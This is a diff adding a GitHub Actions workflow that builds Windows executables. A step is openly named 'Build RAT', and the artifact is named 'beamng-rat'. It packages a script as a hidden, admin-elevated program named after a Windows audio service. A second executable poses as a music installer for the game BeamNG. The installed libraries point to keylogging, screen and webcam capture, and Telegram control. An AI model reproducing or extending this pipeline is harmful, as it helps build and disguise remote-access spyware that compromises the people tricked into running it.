@@ -1,0 +1,35 @@
+name: Build EXE
+
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - uses: actions/checkout@v3
+    
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
+    
+    - name: Install dependencies
+      run: |
+        pip install pyinstaller python-telegram-bot pillow opencv-python pynput cryptography pywin32 pyaudio requests psutil wmi pyautogui numpy
+    
+    - name: Build RAT
+      run: |
+        pyinstaller --onefile --noconsole --uac-admin tat.py --name AudioEndpointService.exe
+    
+    - name: Build Setup
+      run: |
+        pyinstaller --onefile --noconsole --uac-admin setup_installer.py --name BeamNG_Music_Setup.exe
+    
+    - name: Upload artifacts
+      uses: actions/upload-artifact@v3
+      with:
+        name: beamng-rat
+        path: dist/*.exe
